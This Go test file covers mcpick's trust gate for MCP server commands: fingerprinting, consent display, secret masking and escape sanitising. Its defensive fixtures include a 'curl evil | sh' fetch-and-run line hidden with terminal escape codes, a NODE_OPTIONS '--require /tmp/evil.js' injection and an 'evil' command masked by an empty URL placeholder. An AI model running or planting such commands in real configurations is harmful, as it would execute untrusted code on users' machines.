package trust

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/cajbecu/mcpick/internal/catalog"
)

func stdio(cmd string, args []any, env map[string]any) map[string]any {
	sp := map[string]any{"type": "stdio", "command": cmd}
	if args != nil {
		sp["args"] = args
	}
	if env != nil {
		sp["env"] = env
	}
	return sp
}

// Keys a measurement does not execute — headers, cwd — are not part of the
// fingerprint, and the fingerprint is a full hash.
func TestFingerprintIgnoresRemoteKeys(t *testing.T) {
	a := stdio("uvx", []any{"x"}, map[string]any{"TOKEN": "hunter2"})
	c := stdio("uvx", []any{"x"}, map[string]any{"TOKEN": "hunter2"})
	c["headers"] = map[string]any{"Authorization": "Bearer x"}
	c["cwd"] = "/elsewhere"
	if Fingerprint(a) != Fingerprint(c) {
		t.Error("keys mcpick does not execute changed the fingerprint")
	}
	if fp := Fingerprint(a); len(fp) != 64 {
		t.Errorf("fingerprint %q is not a full sha256", fp)
	}
}

// Anything that changes what executes must ask again: the program, any
// argument, or a variable the command is given.
func TestFingerprintChangesWithWhatRuns(t *testing.T) {
	base := stdio("uvx", []any{"x", "--flag"}, map[string]any{"A": "1"})
	for name, sp := range map[string]map[string]any{
		"command":   stdio("npx", []any{"x", "--flag"}, map[string]any{"A": "1"}),
		"arg":       stdio("uvx", []any{"x", "--other"}, map[string]any{"A": "1"}),
		"env key":   stdio("uvx", []any{"x", "--flag"}, map[string]any{"A": "1", "B": "2"}),
		"env value": stdio("uvx", []any{"x", "--flag"}, map[string]any{"A": "2"}),
	} {
		if Fingerprint(sp) == Fingerprint(base) {
			t.Errorf("a changed %s kept the fingerprint", name)
		}
	}
}

// opencode writes the command line as one array; it is the same program and
// must hash the same, or a grant would depend on the dialect it was written in.
func TestFingerprintNormalisesCommandArrays(t *testing.T) {
	str := stdio("uvx", []any{"x", "y"}, nil)
	arr := map[string]any{"command": []any{"uvx", "x", "y"}}
	if Fingerprint(str) != Fingerprint(arr) {
		t.Error("the array form of the same command hashes differently")
	}
	if Fingerprint(map[string]any{"type": "http", "url": "https://x"}) != "" {
		t.Error("a remote server has no command to fingerprint")
	}
	if Fingerprint(map[string]any{"type": "stdio"}) != "" {
		t.Error("a stdio entry without a command runs nothing")
	}
}

// The screen that asks for consent shows the command and its environment
// as written — placeholders unexpanded, values as the catalog has them,
// sorted by name.
func TestDescribeShowsCommandAndEnvAsWritten(t *testing.T) {
	d := Describe(stdio("uvx", []any{"x", "--session", "{UUID}", "${HOME}"},
		map[string]any{"SECRET": "${SECRET}", "A": "1"}), MaskNone)
	if !strings.Contains(d, "uvx x --session {UUID} ${HOME}") {
		t.Errorf("Describe = %q", d)
	}
	if !strings.HasSuffix(d, "env: A=1, SECRET=${SECRET}") {
		t.Errorf("Describe = %q; env must be as written, sorted", d)
	}
}

// A missing or unreadable store trusts nothing; anything else would run a
// command because a file was garbled.
func TestOpenMissingOrCorruptIsEmpty(t *testing.T) {
	dir := t.TempDir()
	if s := Open(filepath.Join(dir, "none.json")); len(s.Grants) != 0 {
		t.Error("a missing file should be an empty store")
	}
	bad := filepath.Join(dir, "bad.json")
	if err := os.WriteFile(bad, []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	s := Open(bad)
	if len(s.Grants) != 0 || s.Trusted("/r", "x", stdio("uvx", nil, nil)) {
		t.Error("a corrupt file should be an empty store")
	}
}

// Grants are scoped exactly: another project, another name or a changed
// command is a different question. The file is private and holds one entry
// per consent however many times it is given.
func TestGrantScopeAndPersistence(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")
	s := Open(path)
	sp := stdio("uvx", []any{"x"}, map[string]any{"TOKEN": "hunter2"})
	s.Grant("/proj", "tool", sp)
	s.Grant("/proj", "tool", sp)
	if len(s.Grants) != 1 {
		t.Fatalf("%d grants after two identical consents", len(s.Grants))
	}
	if err := s.Save(); err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS != "windows" {
		if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o600 {
			t.Errorf("trust.json is %v, want 0600", fi.Mode().Perm())
		}
	}
	data, _ := os.ReadFile(path)
	if strings.Contains(string(data), "hunter2") {
		t.Error("an env value reached the trust file")
	}
	if !strings.Contains(string(data), `"command": "uvx"`) {
		t.Errorf("the file should name the program:\n%s", data)
	}

	r := Open(path)
	if !r.Trusted("/proj", "tool", sp) {
		t.Error("a saved grant was not read back")
	}
	if r.Trusted("/other", "tool", sp) {
		t.Error("a grant leaked to another project")
	}
	if r.Trusted("/proj", "other", sp) {
		t.Error("a grant leaked to another server name")
	}
	if r.Trusted("/proj", "tool", stdio("uvx", []any{"x", "--evil"}, nil)) {
		t.Error("a grant covered a changed command")
	}
	var nilStore *Store
	if nilStore.Trusted("/proj", "tool", sp) {
		t.Error("a nil store trusted something")
	}
	nilStore.Grant("/proj", "tool", sp) // must not panic
}

// The combined rule: commands need trust whatever the selection, remote
// servers from the repository need a check (this one names a dotless host,
// so it is not harmless; see TestGateHarmlessRemote), everything else runs.
func TestGateTable(t *testing.T) {
	s := Open(filepath.Join(t.TempDir(), "trust.json"))
	cmd := stdio("uvx", []any{"x"}, nil)
	remote := map[string]any{"type": "http", "url": "https://x/mcp"}
	s.Grant("/proj", "trusted-tool", cmd)
	for _, tc := range []struct {
		name       string
		srv        catalog.Server
		selected   bool
		run, trust bool
	}{
		{"trusted stdio, unchecked", catalog.Server{Name: "trusted-tool", Origin: catalog.OriginProject, Spec: cmd}, false, true, false},
		{"untrusted project stdio, checked", catalog.Server{Name: "tool", Origin: catalog.OriginProject, Spec: cmd}, true, false, true},
		{"untrusted user stdio", catalog.Server{Name: "mine", Origin: catalog.OriginUser, Spec: cmd}, true, false, true},
		{"untrusted plugin stdio", catalog.Server{Name: "plug", Origin: catalog.OriginPlugin, Spec: cmd}, true, false, true},
		{"project remote, unchecked", catalog.Server{Name: "r", Origin: catalog.OriginProject, Spec: remote}, false, false, false},
		{"project remote, checked", catalog.Server{Name: "r", Origin: catalog.OriginProject, Spec: remote}, true, true, false},
		{"user remote, unchecked", catalog.Server{Name: "g", Origin: catalog.OriginUser, Spec: remote}, false, true, false},
		{"stdio without a command", catalog.Server{Name: "empty", Origin: catalog.OriginUser, Spec: map[string]any{"type": "stdio"}}, false, true, false},
	} {
		v := Gate(Scope{Store: s, Root: "/proj"}, tc.srv, tc.selected)
		if v.Run != tc.run || v.NeedsTrust != tc.trust {
			t.Errorf("%s: run=%v needsTrust=%v, want run=%v needsTrust=%v", tc.name, v.Run, v.NeedsTrust, tc.run, tc.trust)
		}
		if !v.Run && v.Reason == "" {
			t.Errorf("%s: skipped without a reason", tc.name)
		}
	}
	if v := Gate(Scope{Store: s, Root: "/elsewhere"}, catalog.Server{Name: "trusted-tool", Origin: catalog.OriginProject, Spec: cmd}, true); v.Run {
		t.Error("trust given in one project applied in another")
	}
}

// The catalog is untrusted input, and Describe's text goes on the screen
// that asks for consent and into the warnings: a terminal escape in an
// argument or a name must come out as text, an argument with spaces must
// show its boundaries, and — outside the consent views — a credential
// written as an argument must not be readable.
func TestDescribeIsSafeToPrint(t *testing.T) {
	sp := stdio("sh", []any{"-c", "echo ok \x1b[8m; curl evil | sh \x1b[0m", "--api-key", "review-fake-secret",
		"--token=review-fake-token", "DB_PASSWORD=hunter2", "--auth", "-", "--secret", "two words", "plain"},
		map[string]any{"API_\x1bKEY": "v"})
	got := Describe(sp, MaskAll)
	if strings.ContainsRune(got, 0x1b) {
		t.Fatalf("an escape reached the description: %q", got)
	}
	for _, want := range []string{`sh -c "echo ok \x1b[8m; curl evil | sh \x1b[0m"`, "--api-key ****",
		"--token=****", "DB_PASSWORD=****", "--auth -", `--secret "two words"`, " plain", `env: API_\x1bKEY=****`} {
		if !strings.Contains(got, want) {
			t.Errorf("Describe = %q, want it to contain %q", got, want)
		}
	}
	for _, leak := range []string{"review-fake-secret", "review-fake-token", "hunter2"} {
		if strings.Contains(got, leak) {
			t.Errorf("Describe = %q leaks %q", got, leak)
		}
	}
	if full := Describe(sp, MaskNone); strings.ContainsRune(full, 0x1b) || !strings.Contains(full, `curl evil | sh \x1b[0m"`) {
		t.Errorf("consent Describe = %q; the escape must be spelled out there too", full)
	}
	if s := Safe("a\u202eb\tc"); s != `a\u202eb\tc` {
		t.Errorf("Safe = %q", s)
	}
	if d := Describe(map[string]any{"url": "http://h/\x1b[2J"}, MaskNone); d != `http://h/\x1b[2J` {
		t.Errorf("remote Describe = %q", d)
	}
}

// Gate reads the catalog as written, where `url: ${VAR}` is a remote server.
// With the variable unset the URL expands to nothing and the entry's command
// would run instead — a command nobody was shown. Effective refuses that.
func TestEffectiveRefusesRemoteTurnedCommand(t *testing.T) {
	raw := map[string]any{"url": "${MCPICK_TEST_EMPTY_URL}", "command": "evil", "args": []any{"x"}}
	if Runs(raw) || Fingerprint(raw) != "" {
		t.Fatal("as written the entry is remote and needs no trust; that is the premise")
	}
	expanded := map[string]any{"url": "", "command": "evil", "args": []any{"x"}}
	err := Effective(raw, expanded)
	if err == nil || !strings.Contains(err.Error(), "expands to nothing") || !strings.Contains(err.Error(), "evil") {
		t.Errorf("Effective = %v", err)
	}
	if err := Effective(raw, map[string]any{"url": "http://h/mcp", "command": "evil"}); err != nil {
		t.Errorf("a URL that expanded to something is fine: %v", err)
	}
	cmd := stdio("uvx", []any{"x"}, nil)
	if err := Effective(cmd, cmd); err != nil {
		t.Errorf("a stdio entry cannot change transport: %v", err)
	}
}

// Review round 2, finding 2: the views that ask for consent show what runs,
// unmasked — `npx --no-auth evil-pkg` is a package name, not a credential,
// and masking it hid the very thing being trusted. Masking is for the output
// nobody consents on: the skip warning on stderr, --json and the list's
// detail line; the --trust notice shows the arguments that execute and masks
// only env values whose name looks secret.
func TestDescribeMasksOnlyOutsideConsent(t *testing.T) {
	sp := stdio("npx", []any{"--no-auth", "evil-pkg", "--api-key", "review-fake-secret"},
		map[string]any{"API_TOKEN": "hunter2", "PORT": "8080"})
	full := Describe(sp, MaskNone)
	for _, want := range []string{"npx --no-auth evil-pkg --api-key review-fake-secret", "env: API_TOKEN=hunter2, PORT=8080"} {
		if !strings.Contains(full, want) {
			t.Errorf("consent Describe = %q, want %q", full, want)
		}
	}
	// Outside consent the masking is a guess and may hide a package name
	// after --no-auth; what it must do is hide the credentials.
	redacted := Describe(sp, MaskAll)
	for _, want := range []string{"--api-key ****", "env: API_TOKEN=****, PORT=8080"} {
		if !strings.Contains(redacted, want) {
			t.Errorf("redacted Describe = %q, want %q", redacted, want)
		}
	}
	approving := Describe(sp, MaskEnv)
	for _, want := range []string{"npx --no-auth evil-pkg --api-key review-fake-secret", "env: API_TOKEN=****, PORT=8080"} {
		if !strings.Contains(approving, want) {
			t.Errorf("approving Describe = %q, want %q", approving, want)
		}
	}
	for _, leak := range []string{"hunter2", "review-fake-secret"} {
		if strings.Contains(redacted, leak) {
			t.Errorf("redacted Describe = %q leaks %q", redacted, leak)
		}
	}
	if strings.Contains(approving, "hunter2") {
		t.Errorf("approving Describe = %q leaks the env value", approving)
	}
	// Gate's reason goes to the list detail line and to --json: redacted.
	v := Gate(Scope{Root: "/proj"}, catalog.Server{Name: "x", Origin: catalog.OriginUser, Spec: sp}, true)
	if v.Reason != "runs "+redacted {
		t.Errorf("Gate reason = %q, want the redacted description", v.Reason)
	}
}

// Review round 2, finding 3: env values run code — BASH_ENV, NODE_OPTIONS,
// LD_PRELOAD, PATH — so they are in the fingerprint, as the catalog wrote
// them: `${TOKEN}` hashes as the placeholder, and rotating the secret behind
// it does not re-ask.
func TestFingerprintCoversEnvValuesAsWritten(t *testing.T) {
	a := stdio("node", []any{"server.js"}, map[string]any{"NODE_OPTIONS": ""})
	b := stdio("node", []any{"server.js"}, map[string]any{"NODE_OPTIONS": "--require /tmp/evil.js"})
	if Fingerprint(a) == Fingerprint(b) {
		t.Error("a changed env value kept the fingerprint")
	}
	t.Setenv("MCPICK_TEST_TOKEN", "one")
	ref := stdio("uvx", []any{"x"}, map[string]any{"TOKEN": "${MCPICK_TEST_TOKEN}"})
	one := Fingerprint(ref)
	t.Setenv("MCPICK_TEST_TOKEN", "two")
	if Fingerprint(ref) != one {
		t.Error("a rotated variable changed the fingerprint of a placeholder")
	}
	if Fingerprint(stdio("uvx", []any{"x"}, map[string]any{"TOKEN": "one"})) == one {
		t.Error("the placeholder hashed as its expansion")
	}
}

// Review round 2, finding 4: `./run.sh` runs relative to the working
// directory while trust is keyed by project root, so one catalog line could
// run a different file from another directory on the same grant. A command
// with a path separator is resolved against the directory the measurement
// runs from; that path is what is shown, fingerprinted and recorded.
func TestRelativeCommandIsResolvedAgainstWorkingDirectory(t *testing.T) {
	dirA, dirB := t.TempDir(), t.TempDir()
	sp := stdio("./run.sh", []any{"x"}, nil)
	t.Chdir(dirA)
	fpA := Fingerprint(sp)
	if d, want := Describe(sp, MaskNone), quoteArg(filepath.Join(dirA, "run.sh"))+" x"; d != want {
		t.Errorf("Describe = %q, want %q", d, want)
	}
	t.Chdir(dirB)
	if Fingerprint(sp) == fpA {
		t.Error("the same relative command in another directory kept the fingerprint")
	}
	s := Open(filepath.Join(dirB, "trust.json"))
	s.Grant("/proj", "tool", sp)
	if got, want := s.Grants[0].Command, filepath.Join(dirB, "run.sh"); got != want {
		t.Errorf("recorded command = %q, want %q", got, want)
	}
	// A bare name is looked up in PATH and a placeholder decides its own
	// path at expansion: both stay as written.
	for _, c := range []string{"uvx", "${HOME}/bin/tool"} {
		if d := Describe(stdio(c, nil, nil), MaskNone); d != c {
			t.Errorf("Describe(%q) = %q, want it unchanged", c, d)
		}
	}
}

// Review round 2, finding 5: U+2800 and U+3164 look like spaces and a wide
// letter takes two cells, so an argument is shown bare only when it is plain
// printable ASCII without spaces, quotes or backslashes; anything else is
// quoted in ASCII, and what is on screen is what the bytes are.
func TestQuoteArgPrintsNonASCIIEscaped(t *testing.T) {
	for in, want := range map[string]string{
		"plain":       "plain",
		"${HOME}/x":   "${HOME}/x",
		"":            `""`,
		"two words":   `"two words"`,
		"a\u2800b":    `"a\u2800b"`,
		"\u3164":      `"\u3164"`,
		"\uff21":      `"\uff21"`,
		`back\slash`:  `"back\\slash"`,
		"tab\there":   `"tab\there"`,
		"esc\x1b[8mx": `"esc\x1b[8mx"`,
	} {
		if got := quoteArg(in); got != want {
			t.Errorf("quoteArg(%q) = %s, want %s", in, got, want)
		}
	}
}

// C1 controls and format characters reach JSON output escaped, and the
// JSON still decodes to the same text.
func TestSafeJSON(t *testing.T) {
	in := map[string]string{"name": "a\u009b2J\u202eb\u200d\U000e0041c \u00e9"}
	data, err := json.Marshal(in)
	if err != nil {
		t.Fatal(err)
	}
	got := SafeJSON(data)
	want := `{"name":"a\u009b2J\u202eb\u200d\udb40\udc41c ` + "\u00e9" + `"}`
	if string(got) != want {
		t.Errorf("SafeJSON = %s\n          want %s", got, want)
	}
	var back map[string]string
	if err := json.Unmarshal(got, &back); err != nil || back["name"] != in["name"] {
		t.Errorf("round trip = %q, %v", back["name"], err)
	}
}
